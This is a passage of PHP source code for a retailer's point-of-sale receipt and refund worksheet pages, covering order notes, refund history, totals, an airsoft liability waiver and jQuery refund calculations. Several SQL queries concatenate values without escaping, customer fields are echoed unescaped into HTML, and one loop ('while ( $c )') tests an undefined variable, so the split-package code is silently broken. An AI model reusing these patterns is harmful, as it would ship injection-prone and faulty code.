      $notesinfo['orders_notes'] = str_replace( "\n", '<br/>', $notesinfo['orders_notes'] );
      $notesinfo['orders_notes'] = str_replace( "\'", "'", $notesinfo['orders_notes'] );
      if ( preg_match( '/POS notes by ([\w]+) ([\w]+):/', $notesinfo['orders_notes'], $onotematches ) ) {
        $posrep = ' (' . substr( $onotematches[1], 0, 1 ) . substr( $onotematches[2], 0, 1 ) . ')';
        $notesinfo['orders_notes'] = preg_replace( '/' . $onotematches[0] . '<br\/>/', '', $notesinfo['orders_notes'] );
      }
      elseif ( preg_match( '/ID information collected by: ([\w]+) ([\w]+)/', $notesinfo['orders_notes'], $onotematches ) ) {
        $posrep = ' (' . substr( $onotematches[1], 0, 1 ) . substr( $onotematches[2], 0, 1 ) . ')';
        $notesinfo['orders_notes'] = preg_replace( '/' . $onotematches[0] . '<br\/>/', '', $notesinfo['orders_notes'] );
      }
      if ( $posrep == '' && $notesinfo['admin_id'] > 0 ) {
        $adminquery = mysqli_query( $link, "SELECT * FROM admin WHERE admin_id='" . (int)$notesinfo['admin_id'] . "'" );
        $admininfo = mysqli_fetch_array( $adminquery );
        if ( $admininfo['admin_firstname'] != '' || $admininfo['admin_lastname'] != '' ) { $posrep = ' (' . substr( $admininfo['admin_firstname'], 0, 1 ) . substr( $admininfo['admin_lastname'], 0, 1 ) . ')'; }
      }
      if ( $notescontent != '' ) { $notescontent .= '<br/>'; }
      $notescontent .= '<i>' . date( "F j, Y, g:ia", strtotime( $notesinfo['orders_notes_created'] ) ) . $posrep . '</i><br/>' . $notesinfo['orders_notes'] . '<br/>';
    }
    if ( $notescontent != '' ) { echo '<div class="receiptnotes"><h4>Notes</h4><p>' . $notescontent . '</p>' . $addnotescontent . '</div>'; }
    else { echo '<div class="receiptnotes"><h4>Notes</h4>' . $addnotescontent . '</div>'; }
    echo '</div>';

    $breakdowncounter = 0;
    $refundcontent = '';
    #$refunddayquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "' GROUP BY orders_refunds_date ORDER BY orders_refunds_date ASC" ); # Updated to group everything within a minute together
    $refunddayquery = mysqli_query( $link, "SELECT *, ( unix_timestamp( orders_refunds_date ) - unix_timestamp(orders_refunds_date)%60 ) orders_refunds_date_min FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "' GROUP BY orders_refunds_date_min ORDER BY orders_refunds_date ASC" );
    while ( $refunddayinfo = mysqli_fetch_array( $refunddayquery ) ) {
      $refundtotal = array();
      $refundbreakdown = array();
      #$refundquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "' AND orders_refunds_date='" . $refunddayinfo['orders_refunds_date'] . "'" );
      $refundquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "' AND orders_refunds_date>='" . date( "Y-m-d G:i", strtotime( $refunddayinfo['orders_refunds_date'] ) ) . ":00' AND orders_refunds_date<='" . date( "Y-m-d G:i", strtotime( $refunddayinfo['orders_refunds_date'] ) ) . ":59'" );
      while ( $refundinfo = mysqli_fetch_array( $refundquery ) ) {
        if ( $refundinfo['orders_refunds_qty'] > 0 ) { $refundtotal[$refundinfo['orders_refunds_method']] += $refundinfo['orders_refunds_amount'] * $refundinfo['orders_refunds_qty']; }
        else { $refundtotal[$refundinfo['orders_refunds_method']] += $refundinfo['orders_refunds_amount']; }
        if ( $refundinfo['orders_refunds_type'] == 'products' ) { $refundbreakdown[$refundinfo['orders_refunds_method']] .= '$' . number_format( $refundinfo['orders_refunds_amount'] * $refundinfo['orders_refunds_qty'], 2 ) . ' - PID ' . $refundinfo['products_id'] . ' x' . $refundinfo['orders_refunds_qty'] . '<br/>'; }
        elseif ( $refundinfo['orders_refunds_type'] == 'products_tax' ) { $refundbreakdown[$refundinfo['orders_refunds_method']] .= '$' . number_format( $refundinfo['orders_refunds_amount'] * $refundinfo['orders_refunds_qty'], 2 ) . ' - PID ' . $refundinfo['products_id'] . ' x' . $refundinfo['orders_refunds_qty'] . ' (Tax)<br/>'; }
        elseif ( $refundinfo['orders_refunds_type'] == 'shipping' ) { $refundbreakdown[$refundinfo['orders_refunds_method']] .= '$' . number_format( $refundinfo['orders_refunds_amount'], 2 ) . ' - Shipping<br/>'; }
        elseif ( $refundinfo['orders_refunds_type'] == 'manual' ) { $refundbreakdown[$refundinfo['orders_refunds_method']] .= '$' . number_format( $refundinfo['orders_refunds_amount'], 2 ) . ' - Manual<br/>'; }
      }
      $posrep = '';
      if ( $refunddayinfo['pos_users_id'] > 0 ) {
        $puquery = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_id='" . (int)$refunddayinfo['pos_users_id'] . "'" );
        $puinfo = mysqli_fetch_array( $puquery );
        if ( $puinfo['pos_users_firstname'] != '' || $puinfo['pos_users_lastname'] != '' ) { $posrep = substr( $puinfo['pos_users_firstname'], 0, 1 ) . substr( $puinfo['pos_users_lastname'], 0, 1 ); }
      }
      if ( $posrep == '' && $refunddayinfo['admin_id'] > 0 ) {
        $adminquery = mysqli_query( $link, "SELECT * FROM admin WHERE admin_id='" . (int)$refunddayinfo['admin_id'] . "'" );
        $admininfo = mysqli_fetch_array( $adminquery );
        if ( $admininfo['admin_firstname'] != '' || $admininfo['admin_lastname'] != '' ) { $posrep = substr( $admininfo['admin_firstname'], 0, 1 ) . substr( $admininfo['admin_lastname'], 0, 1 ); }
      }
      foreach ( $refundtotal as $refundmethod => $refundamount ) {
        $refundcontent .= '<tr><td>' . $refunddayinfo['orders_refunds_date'] . '</td><td><a onclick="$(\'#breakdownbox' . $breakdowncounter . '\').show();" style="cursor:pointer;">$' . number_format( $refundamount, 2 ) . '</a><div id="breakdownbox' . $breakdowncounter . '" class="donotprint" style="display:none;border-top:1px solid #000;">' . $refundbreakdown[$refundmethod] . '</div></td><td>' . $refundmethod . '</td><td>' . $posrep . '</td></tr>';
        $breakdowncounter++;
      }
    }
    if ( $refundcontent != '' ) {
      echo '<style>.refundtable th { border-bottom: 2px solid #000; } .refundtable td { padding: 2px 10px; text-align: center; }</style>';
      echo '<div class="refundhistory"><h4>Refund History</h4><table class="refundtable">';
      echo '<tr><th>Date</th><th>Amount</th><th>Method</th><th>Staff</th></tr>';
      echo $refundcontent;
      echo '</table></div>';
    }

    $requiredisclaimer = false;
    $numitems = 0;
    echo '<table class="checkoutproducts">';
    echo '<tr><th>Product Description</th><th>Price</th><th>Qty</th><th>Total</th></tr>';
    $orderproductsquery = mysqli_query( $link, "SELECT * FROM orders_products WHERE orders_id='" . $orderinfo['orders_id'] . "'" );
    while ( $orderproductsinfo = mysqli_fetch_array( $orderproductsquery ) ) {
      $productcatquery = mysqli_query( $link, "SELECT categories_id FROM products_to_categories WHERE products_id='" . $orderproductsinfo['products_id'] . "'" );
      while ( $productcatinfo = mysqli_fetch_array( $productcatquery ) ) { if ( in_array( $productcatinfo['categories_id'], $disclaimercats ) && !in_array( $orderproductsinfo['products_id'], $disclaimerexclusionproducts ) ) { $requiredisclaimer = true; } }
      if ( $splitlogged == true && $orderproductsinfo['products_multisplit_parent_pid'] > 0 ) { continue; }
      elseif ( $splitlogged == false ) {
        if ( $splitchildren[$orderproductsinfo['products_id']] > 0 ) { $orderproductsinfo['products_quantity'] -= $splitchildren[$orderproductsinfo['products_id']]; }
        foreach ( $splitpackages as $parentpid => $childproducts ) {
          foreach ( $childproducts as $childpid => $childqty ) {
            if ( $orderproductsinfo['products_id'] == $childpid ) { $splitparents[$parentpid]['price'] += $orderproductsinfo['final_price'] * $childqty; }
          }
        }
      }
      if ( $orderproductsinfo['products_quantity'] <= 0 ) { continue; }
      echo '<tr>';
      echo '<td class="main" valign="top">' . $orderproductsinfo['products_name'];
      echo '<br/><small>(PID: ' . $orderproductsinfo['products_id'] . ' / Model: ' . $orderproductsinfo['products_model'] . ')</small>';
      if ( $orderproductsinfo['products_multisplit_parent_pid'] > 0 ) { echo '<small style="margin-left:10px;color:red;">* Part of package (' . $orderproductsinfo['products_multisplit_parent_pid'] . ')</small>'; }
      echo '</td>';
      echo '<td class="main" align="right" valign="top">$' . number_format( $orderproductsinfo['final_price'], 2 ) . '</td>';
      echo '<td class="main" align="right" valign="top">' . number_format( $orderproductsinfo['products_quantity'] ) . '</td>';
      echo '<td class="main" align="right" valign="top">$' . number_format( $orderproductsinfo['final_price'] * $orderproductsinfo['products_quantity'], 2 ) . '</td>';
      echo '</tr>' . "\n";
      $numitems += $orderproductsinfo['products_quantity'];
    }
    #foreach ( $splitpackages as $parentpid => $childproducts ) {
    foreach ( $splitparents as $parentpid => $parentdata ) {
      if ( $splitlogged == true && $splitparents[$parentpid]['qty'] > 0 ) { $splitparents[$parentpid]['price'] = $splitparents[$parentpid]['price'] / $splitparents[$parentpid]['qty']; }
      $product_query = mysqli_query( $link, "SELECT * FROM products p LEFT JOIN products_description pd ON p.products_id=pd.products_id WHERE p.products_id='" . $parentpid . "'" );
      $product_data = mysqli_fetch_array( $product_query );
      $productcatquery = mysqli_query( $link, "SELECT categories_id FROM products_to_categories WHERE products_id='" . $parentpid . "'" );
      while ( $productcatinfo = mysqli_fetch_array( $productcatquery ) ) { if ( in_array( $productcatinfo['categories_id'], $disclaimercats ) && !in_array( $parentpid, $disclaimerexclusionproducts ) ) { $requiredisclaimer = true; } }
      echo '<tr>';
      echo '<td class="main" valign="top">' . $product_data['products_name'];
      echo '<br/><small>(PID: ' . $parentpid . ' / Model: ' . $product_data['products_model'] . ')</small>';
      echo '</td>';
      echo '<td class="main" align="right" valign="top">$' . number_format( $splitparents[$parentpid]['price'], 2 ) . '</td>';
      echo '<td class="main" align="right" valign="top">' . number_format( $splitparents[$parentpid]['qty'] ) . '</td>';
      echo '<td class="main" align="right" valign="top">$' . number_format( round( $splitparents[$parentpid]['price'], 2 ) * $splitparents[$parentpid]['qty'], 2 ) . '</td>';
      echo '</tr>' . "\n";
      $numitems += $splitparents[$parentpid]['qty'];
    }
    $ordertotalcounter = 0;
    $balancedue = 0;
    $isdiscount = false;
    $ordertotalsquery = mysqli_query( $link, "SELECT * FROM orders_total WHERE orders_id='" . $orderinfo['orders_id'] . "' ORDER BY sort_order ASC" );
    while ( $ordertotalsinfo = mysqli_fetch_array( $ordertotalsquery ) ) {
      if ( $ordertotalsinfo['class'] == 'ot_discount_coupon' ) { $isdiscount = true; }
      if ( $ordertotalsinfo['class'] == 'ot_subtotal' && $isdiscount == true ) {
        echo '<tr><td colspan="3" style="text-align:right;">Subtotal (After Discount):</td><td>' . $ordertotalsinfo['text'] . '</td></tr>' . "\n";
      }
      else { echo '<tr><td colspan="3" style="text-align:right;">' . $ordertotalsinfo['title'] . '</td><td>' . $ordertotalsinfo['text'] . '</td></tr>' . "\n"; }
      if ( $ordertotalsinfo['class'] == 'ot_total' ) { $balancedue = $ordertotalsinfo['value']; }
      $ordertotalcounter++;
    }
    if ( $ordertotalcounter < 4 ) { for ( $i = $ordertotalcounter; $i < 4; $i++ ) { echo '<tr><td>&nbsp;</td></tr>'; } }
    $paymentcontents = array();
    $orderpaymentsquery = mysqli_query( $link, "SELECT * FROM payments_store WHERE orders_id='" . $orderinfo['orders_id'] . "'" );
    while ( $orderpaymentsinfo = mysqli_fetch_array( $orderpaymentsquery ) ) {
      /*if ( $orderpaymentsinfo['payments_store_amount'] < 0 ) {
        if ( $orderpaymentsinfo['payments_store_method'] == 'Cash' ) { $orderpaymentsinfo['payments_store_method'] = 'Change'; }
        echo '<tr><td colspan="3" style="text-align:right;">' . $orderpaymentsinfo['payments_store_method'] . ':</td><td>$' . number_format( $orderpaymentsinfo['payments_store_amount'] * -1, 2 ) . '</td></tr>' . "\n";
      }
      else {
        echo '<tr><td colspan="3" style="text-align:right;">' . $orderpaymentsinfo['payments_store_method'] . ':</td><td>-$' . number_format( $orderpaymentsinfo['payments_store_amount'], 2 ) . '</td></tr>' . "\n";
      }*/
      $paymentcontents[$orderpaymentsinfo['payments_store_method']] += $orderpaymentsinfo['payments_store_amount'];
      $balancedue -= round( $orderpaymentsinfo['payments_store_amount'], 2 );
    }
    $cashcounter = 0;
    $cashtotal = 0;
    foreach ( $paymentcontents as $paymenttype => $paymentamount ) {
      if ( $paymenttype == 'Cash' || $paymenttype == 'Change' ) { $cashtotal += $paymentamount; $cashcounter++; }
      if ( $paymentamount < 0 ) {
        if ( $paymenttype == 'Cash' ) { $paymenttype = 'Change'; }
        echo '<tr><td colspan="3" style="text-align:right;">' . $paymenttype . ':</td><td>$' . number_format( $paymentamount * -1, 2 ) . '</td></tr>' . "\n";
      }
      else {
        echo '<tr><td colspan="3" style="text-align:right;">' . $paymenttype . ':</td><td>-$' . number_format( $paymentamount, 2 ) . '</td></tr>' . "\n";
      }
      $ordertotalcounter++;
    }
    if ( $cashcounter > 1 && round( $cashtotal, 2 ) > 0 ) { echo '<tr><td colspan="3" style="text-align:right;">Total Cash Received:</td><td>$' . number_format( $cashtotal, 2 ) . '</td></tr>'; $ordertotalcounter++; }
    elseif ( $cashcounter > 1 && round( $cashtotal, 2 ) < 0 ) { echo '<tr><td colspan="3" style="text-align:right;">Total Cash Paid:</td><td>$-' . number_format( $cashtotal, 2 ) . '</td></tr>'; $ordertotalcounter++; }
    if ( $balancedue >= -0.02 && $balancedue <= 0.02 ) { $balancedue = 0; }
    if ( $balancedue < 0 ) { echo '<tr><td colspan="3" style="text-align:right;"><b>Credit:</b></td><td><b>$' . number_format( $balancedue * -1, 2 ) . '</b></td></tr>' . "\n"; $ordertotalcounter++; }
    elseif ( $balancedue > 0 ) { echo '<tr><td colspan="3" style="text-align:right;"><b>Balance:</b></td><td><b>$' . number_format( $balancedue, 2 ) . '</b></td></tr>' . "\n"; $ordertotalcounter++; }
    if ( $repinfo['pos_users_firstname'] != '' ) {
      echo '<tr><td colspan="3"></td><td style="text-align:center;font-size:11px;">Rep: ' . strtoupper( substr( $repinfo['pos_users_firstname'], 0, 1 ) );
      if ( $repinfo['pos_users_lastname'] != '' ) { echo strtoupper( substr( $repinfo['pos_users_lastname'], 0, 1 ) ); }
      echo '</td></tr>';
    }
    if ( $ordertotalcounter < 4 ) { for ( $i = $ordertotalcounter; $i < 4; $i++ ) { echo '<tr><td>&nbsp;</td></tr>'; } }
    echo '</table>';

    #if ( ( strtotime( "now" ) > strtotime( '2024-10-18 15:00:00' ) && strtotime( "now" ) < strtotime( '2024-10-19 20:00:00' ) ) || $loginuser == 33 || $loginuser == 14 || $loginuser == 19 ) { echo '<script>$(document).ready(function(){ $("#numitems").append( "' . $numitems . ' Items" ); });</script>'; }
    echo '<script>$(document).ready(function(){ $("#numitems").append( "' . $numitems . ' Items" ); });</script>';

    echo '<div class="disclaimerwarnings">';
    echo '<div class="warnings">';
    echo '<h5>Warning: Battery</h5>';
    echo '<p>Complimentary batteries and wall chargers included with most AEG are for TESTING PURPOSE ONLY. Please carefully read warning and instructions included in packaging before using or charging a battery. Charge batteries with specified chargers only. Do not charge batteries unattended or charge on flammable surface such as carpet.</p>';
    echo '<h5>Warning: Laser</h5>';
    echo '<p>It is a crime for anyone to willfully and maliciously discharge a laser at an aircraft, whether in motion or in flight.</p>';
    echo '</div>';
    echo '</div>';
    echo '<div class="disclaimer">';
    echo '<p>I understand that it is my responsibility to obey all applicable local, state, federal and international laws and regulations with regard to the possession and use of any items purchased or received from Evike.com Inc. I acknowledge that due to their potential strategic value, export of certain products sold by Evike.com may be prohibited by the U.S. International Traffic in Arms Regulations (ITAR) and the U.S. Export Administration Regulations (EAR). I represent that I will not export any prohibited or restricted items purchased from Evike.com.</p>';
    echo '<p>I agree to indemnify and hold harmless Evike.com Inc., its officers, owners, employees, and agents from and against any and all liabilities, damages, penalties, and claims of whatever nature which may arise from my purchase and use of any imitation firearms or Airsoft products from Evike.com Inc.</p>';
    echo '<h4>Return and Warranty:</h4>';
    echo '<p>All products sold from the Evike.com Super Store carry a 45 day warranty from the date of purchase unless otherwise specified. Returns must be new and in original packaging and are subject to a restocking fee. For more details about our warranty and returns, please visit https://www.evike.com/policy/</p>';
    echo '</div>';

    echo '</div>';
    if ( strtotime( "now" ) > strtotime( '2024-10-18 15:00:00' ) && strtotime( "now" ) < strtotime( '2024-10-19 22:00:00' ) ) { $requiredisclaimer = false; } // Disclaimer removed for Airsoftcon duration
    if ( $requiredisclaimer == true ) {
      echo '<div style="page-break-before:always;"></div>';
      echo '<div class="printable">';
      echo '<div class="rcolheader">';
      echo '<h1>Purchase and Warranty Agreement and Liability Waiver</h1>';
      echo '<h2>Order #' . $orderinfo['orders_id'] . '</h2>';
      echo '<h3>Order Date: ' . date( 'm/d/y g:i A', strtotime( $orderinfo['date_purchased'] ) ) . '</h3>';
      echo '</div>';
      //echo '<img src="/images3/logo-evike.png" class="logo" />';
      echo '<p class="headerinfo"><b>Evike.com Superstore</b><br/>2801 W. Mission Rd. Alhambra, CA 91803<br/>Phone: (626) 407-0561</p>';
      echo '<div class="disclaimer" style="margin-top:100px;">';
      echo '<p>I, <strong>' . $orderinfo['customers_name'] . '</strong>, hereby represent and agree that:</p>';
      echo '<ol>';
      echo '<li>I am at least 18 years old. <b>Initial</b> <span></span></li>';
      echo '<li>I understand that Evike.com Inc. will not sell Airsoft guns to anyone under the age of eighteen (18) and that the use of any Airsoft products by anyone under 18 years old must be supervised by an adult. I agree that if I sell/transfer/give any products I purchased or received from Evike.com Inc. to a minor that I shall be the responsible guardian for that minor and I shall assume full responsibility for his or her use of the products, including but not limited to transporting and storing Airsoft products when they are not in use. <b>Initial</b> <span></span></li>';
      echo '<li>I am informed and understand that any person who changes, alters, removes, or obliterates any coloration or markings that are required by any applicable state or federal law or regulation, for any imitation firearm, in a way that makes the imitation firearm or device look more like a firearm, is guilty of a misdemeanor. I acknowledge that the imitation firearm(s) or Airsoft gun(s) I purchased included (an) orange tip(s) and that I will not break the law by attempting to remove the orange tip(s). <b>Initial</b> <span></span> Further, I understand that it is illegal to remove any warning stickers, paint, or markings on any product and that the removal of any such stickers, paint, or markings may void all warranties. <b>Initial</b> <span></span></li>';
      echo '<li>I AM INFORMED THAT AIRSOFT PRODUCTS MAY BE MISTAKEN FOR A FIREARM BY LAW ENFORCEMENT OFFICERS OR OTHERS, THAT ALTERING THE COLORATION OR MARKINGS REQUIRED BY STATE OR FEDERAL LAW OR REGULATIONS SO AS TO MAKE THE PRODUCT LOOK LIKE A FIREARM IS DANGEROUS, AND MAY BE A CRIME, AND THAT BRANDISHING OR DISPLAYING THE PRODUCT IN PUBLIC MAY CAUSE CONFUSION AND MAY BE A CRIME. <b>Initial</b> <span></span></li>';
      echo '<li>I understand that applicable federal and/or state laws provide that the use of an imitation firearm or Airsoft gun in a crime may carry the full ramifications of a real firearm or weapon.  Any person who, except in self-defense, draws or exhibits an imitation firearm or an Airsoft gun in a threatening manner against another in such a way as to cause a reasonable person apprehension or fear of bodily harm may be guilty of a crime punishable by imprisonment. <b>Initial</b> <span></span></li>';
      echo '<li>I represent that I am purchasing an imitation firearm or an Airsoft gun for one of the below lawful and legal reasons: (a) Solely for export in interstate or foreign commerce. (b) Solely for lawful use in theatrical productions, including motion picture, television, and stage productions. (c) For use in a certified or regulated sporting event or competition. (d) For use in military or civil defense activities, or ceremonial activities. (e) For public displays authorized by public or private schools. <b>Initial</b> <span></span></li>';
      echo '<li>I am informed and agree that I will not openly display or expose any imitation firearms or Airsoft guns in a public place. A public place means an area open to the public and includes any of the following: a street, a sidewalk, a bridge, an alley, a plaza, a park, a driveway, a front yard, a parking lot, an automobile (whether moving or not), a building open to the general public (including one that serves food or drink, or provides entertainment), a doorway or entrance to a building or dwelling, a public school, a public or private college or university. <b>Initial</b> <span></span></li>';
      echo '<li>I agree that I shall always wear eye protection while using imitation firearms or Airsoft products or observing Airsoft products being used and agree to be 100% responsible for any damages and injuries caused by my failure to wear eye protection or other negligence. <b>Initial</b> <span></span></li>';
      echo '<li>All guns sold by Evike.com Inc. are REPLICAS ONLY. They are not real firearms. Airsoft replicas are not made or authorized by makers of real guns unless specifically stated. Use of the name of a real gun or real gun maker is solely to assist in identification and does not imply any affiliation with or approval by any real gun maker. <b>Initial</b> <span></span></li>';
      echo '</ol>';
      echo '<p>By signing this agreement, I agree to indemnify and hold harmless Evike.com Inc., its officers, owners, employees, and agents from and against all liabilities, damages, penalties, and claims of whatever nature which may arise from my purchase and use of any imitation firearms or Airsoft products from Evike.com Inc.</p>';
      echo '<div class="signaturebox">';
      echo '<table>';
      if ( $orderinfo['customers_dlid'] != '' ) { echo '<tr><td><b>Driver\'s License No.</b> <strong>' . $orderinfo['customers_dlid'] . '</strong> &nbsp; </td>'; }
      else { echo '<tr><td><b>Driver\'s License No.</b> <span style="width:100px;"></span> &nbsp; </td>'; }
      echo '<td><b>Signature</b> <span style="width:300px;"></span> &nbsp; </td>';
      echo '<td><b>Date</b> <span style="width:60px;"></span></td>';
      echo '</table>';
      echo '</div>';
      echo '<p>I understand that it is my responsibility to obey all applicable local, state, federal and international laws and regulations with regard to the possession and use of any items purchased or received from Evike.com Inc. I acknowledge that due to their potential strategic value, export of certain products sold by Evike.com may be prohibited by the U.S. International Traffic in Arms Regulations (ITAR) and the U.S. Export Administration Regulations (EAR). I represent that I will not export any prohibited or restricted items purchased from Evike.com.</p>';
      echo '<p>I agree to indemnify and hold harmless Evike.com Inc., its officers, owners, employees, and agents from and against any and all liabilities, damages, penalties, and claims of whatever nature which may arise from my purchase and use of any imitation firearms or Airsoft products from Evike.com Inc.</p>';
      echo '<h4>Return and Warranty:</h4>';
      echo '<p>All products sold from the Evike.com Super Store carry a 45 day warranty from the date of purchase unless otherwise specified. Returns must be new and in original packaging and are subject to a restocking fee. For more details about our warranty and returns, please visit https://www.evike.com/policy/</p>';
      echo '</div>';
      echo '</div>';
    }
    echo '<div class="donotprint" style="text-align:center;"><button onclick="window.print();return false;" style="margin:0 auto 30px;width:150px;height:40px;">Print Receipt</button></div>';
  }
  else { $errormsg = 'Order not found.'; }
}
elseif ( $action == 'refund_display' && $_REQUEST['orderid'] > 0 ) {
  $orderquery = mysqli_query( $link, "SELECT o.*, c.* FROM orders o LEFT JOIN customers c ON o.customers_id=c.customers_id WHERE o.orders_id='" . (int)$_REQUEST['orderid'] . "'" );
  $orderinfo = mysqli_fetch_array( $orderquery );
  if ( $orderinfo['orders_id'] > 0 && $orderinfo['orders_id'] == $_REQUEST['orderid'] ) {
    $couponquery = mysqli_query( $link, "SELECT * FROM discount_coupons_to_orders WHERE orders_id='" . (int)$orderinfo['orders_id'] . "'" );
    $coupondata = mysqli_fetch_array( $couponquery );
    // Repackage if it contains labor for wholesale
    $splitpackages = array();
    $splitparents = array();
    $splitchildren = array();
    #if ( $orderinfo['customers_gid'] != 'Tier 0' ) {
      $ordersplitquery = mysqli_query( $link, "SELECT comments FROM orders_status_history WHERE orders_id='" . (int)$orderinfo['orders_id'] . "' AND comments LIKE 'Multiple Products Split%'" );
      while ( $c ) {
        $commentlines = explode( "\n", $ordersplitdetails['comments'] );
        foreach ( $commentlines as $commentline ) {
          if ( preg_match( '/^(\d\d\d\d\d) \[[^\[\]]+] \((\d+)\)/', $commentline, $matches ) ) {
            $haslabor = false;
            $splitlines = explode( ", ", $commentline );
            foreach ( $splitlines as $splitline ) {
              if ( preg_match( '/(\d\d\d\d\d) \[[^\[\]]+\] \((\d+)\)$/', $splitline, $splitmatches ) ) {
                if ( $splitmatches[1] == '57359' ) { $haslabor = true; }
              }
            }
            if ( $haslabor == true ) {
              foreach ( $splitlines as $splitline ) {
                if ( preg_match( '/(\d\d\d\d\d) \[[^\[\]]+\] \((\d+)\)$/', $splitline, $splitmatches ) ) {
                  $splitchildren[$splitmatches[1]] += $splitmatches[2];
                  $splitpackages[$matches[1]][$splitmatches[1]] = $splitmatches[2];
                }
              }
              $splitparents[$matches[1]]['qty'] += $matches[2];
            }
          }
        }
      }
    #}
    echo "<script type='text/javascript' src='/js/barcode.min.js'></script>";
    echo '<div class="printable">';
    echo '<div class="rcolheader">';
    echo '<h1>Refund Worksheet</h1>';
    echo '<h2>Order #' . $orderinfo['orders_id'] . '</h2>';
    echo '<h3>Order Date: ' . date( 'n/j/y g:i A', strtotime( $orderinfo['date_purchased'] ) ) . '</h3>';
    echo '<div class="barcode"><svg id="orderbarcode"></svg></div>';
    echo '<script>JsBarcode( "#orderbarcode", "' . $orderinfo['orders_id'] . '", { width: 1, height: 25, displayValue: false } );</script>';
?>
 <script>
 function refundall() {
  $( '.refundprodqty option:last-child' ).prop( 'selected', true );
  refundcalc();
 }
 function refundcalc() {
  if ( $( '#chargersf' ).val() == 0 ) { $( '.displaynorsf' ).css( 'background-color', '#ddf' ).css( 'font-weight', 'bold' ); }
  else if ( $( '#chargersf' ).val() == 1 || $( '#chargersf' ).val() == 10 || $( '#chargersf' ).val() == 15 || $( '#chargersf' ).val() == 25 || $( '#chargersf' ).val() == 50 ) { $( '.displaynorsf' ).css( 'background-color', '#ecc' ).css( 'font-weight', 'bold' ); }
  var refundTotprod = 0.0;
  var refundTottax = 0.0;
  var totalProducts = parseInt( $( '#refund_total_products' ).val() );
  var checkShipping = parseFloat( $( '#refund_order_shipping' ).val() );
  var checkTotal = parseFloat( $( '#refund_order_total' ).val() );
  for ( i = 0; i < totalProducts; i++ ) {
   var refundQty = parseInt( $( '#refundprodqty'+i ).val() );
   var refundPrice = parseFloat( $( '#refundprodprice'+i ).val() );
   var refundTax = parseFloat( $( '#refundprodtax'+i ).val() );
   if ( $( '#chargersf' ).val() == 1 || $( '#chargersf' ).val() == 15 ) {
    refundPrice = parseFloat( $( '#refundprodrsfprice'+i ).val() );
    refundTax = parseFloat( $( '#refundprodrsftax'+i ).val() );
   }
   else if ( $( '#chargersf' ).val() == 10 ) {
    refundPrice = parseFloat( parseFloat( $( '#refundprodprice'+i ).val() ) * 0.9 );
    refundTax = parseFloat( $( '#refundprodtax'+i ).val() );
   }
   else if ( $( '#chargersf' ).val() == 25 ) {
    refundPrice = parseFloat( parseFloat( $( '#refundprodprice'+i ).val() ) * 0.75 );
    refundTax = parseFloat( $( '#refundprodtax'+i ).val() );
   }
   else if ( $( '#chargersf' ).val() == 50 ) {
    refundPrice = parseFloat( parseFloat( $( '#refundprodprice'+i ).val() ) * 0.5 );
    refundTax = parseFloat( $( '#refundprodtax'+i ).val() );
   }
   var unitRefund = refundPrice + refundTax;
   $( '#displaynorsf'+i ).html( '$'+unitRefund.toFixed(2) );
   refundTotprod += parseFloat( refundQty * refundPrice );
   refundTottax += parseFloat( refundQty * refundTax );
  }
  refundTotprod = parseFloat( refundTotprod );
  refundTottax = parseFloat( refundTottax );
  var refundShipping = parseFloat( $( '#refund_shipping' ).val() );
  if ( refundShipping > checkShipping ) { refundShipping = checkShipping; $( '#refund_shipping' ).val( refundShipping.toFixed(2) ); }
  var refundManual = parseFloat( $( '#refund_manual' ).val() );
  var refundTotal = parseFloat( refundTotprod + refundTottax + refundShipping + refundManual );
  if ( refundTotal > checkTotal ) {
   refundManual = refundManual - ( refundTotal - checkTotal );
   refundTotal = parseFloat( refundTotprod + refundTottax + refundShipping + refundManual );
   $( '#refund_manual' ).val( refundManual.toFixed(2) );
  }
  refundTotprod = refundTotprod.toFixed(2);
  refundTottax = refundTottax.toFixed(2);
  refundTotal = refundTotal.toFixed(2);
  $( '#refund_totprod' ).val( refundTotprod );
  $( '#refund_tottax' ).val( refundTottax );
  $( '#refund_total' ).val( refundTotal );
 }
 </script>
<?php
    $repquery = mysqli_query( $link, "SELECT * FROM payments_store ps LEFT JOIN pos_users pu ON ps.pos_users_id=pu.pos_users_id WHERE ps.orders_id='" . $orderinfo['orders_id'] . "' AND ps.pos_users_id>0" );
    $repinfo = mysqli_fetch_array( $repquery );
    /*if ( $repinfo['pos_users_firstname'] != '' ) {
      echo '<h3>Store Rep: ' . ucfirst( strtolower( $repinfo['pos_users_firstname'] ) );
      if ( $repinfo['pos_users_lastname'] != '' ) { echo ' ' . strtoupper( substr( $repinfo['pos_users_lastname'], 0, 1 ) ) . '.'; }
      echo '</h3>';
    }*/
    echo '</div>';
    //echo '<img src="/images3/logo-evike.png" class="logo" />';
    echo '<p class="headerinfo"><b>Evike.com Superstore</b><br/>2801 W. Mission Rd. Alhambra, CA 91803<br/>Phone: (626) 407-0561</p>';
    echo '<div class="customerinfo">';
    echo '<h4>Customer:</h4>';
    echo '<p class="info">';
    if ( strpos( $orderinfo['customers_email_address'], 'evike.com' ) === false ) {
      if ( $orderinfo['customers_company'] != '' ) { echo $orderinfo['customers_company'] . '<br/>'; }
      if ( $orderinfo['customers_name'] != '' ) { echo $orderinfo['customers_name'] . '<br/>'; }
      if ( $orderinfo['customers_street_address'] != '' ) { echo $orderinfo['customers_street_address'] . '<br/>'; }
      if ( $orderinfo['customers_street_address_2'] != '' && $orderinfo['customers_street_address_2'] != $orderinfo['customers_street_address'] ) { echo $orderinfo['customers_street_address_2'] . '<br/>'; }
      if ( $orderinfo['customers_city'] != '' && ( $orderinfo['customers_state'] != '' || $orderinfo['customers_postcode'] != '' ) ) { echo $orderinfo['customers_city'] . ', ' . $orderinfo['customers_state'] . ' ' . $orderinfo['customers_postcode'] . '<br/>'; }
      if ( $orderinfo['customers_telephone'] != '' ) { echo 'Phone: ' . $orderinfo['customers_telephone'] . '<br/>'; }
      if ( $orderinfo['customers_email_address'] != '' ) { echo 'Email: ' . $orderinfo['customers_email_address']; }
    }
    else { echo 'Evike.com Superstore Walk-in Customer'; }
    echo '</p>';
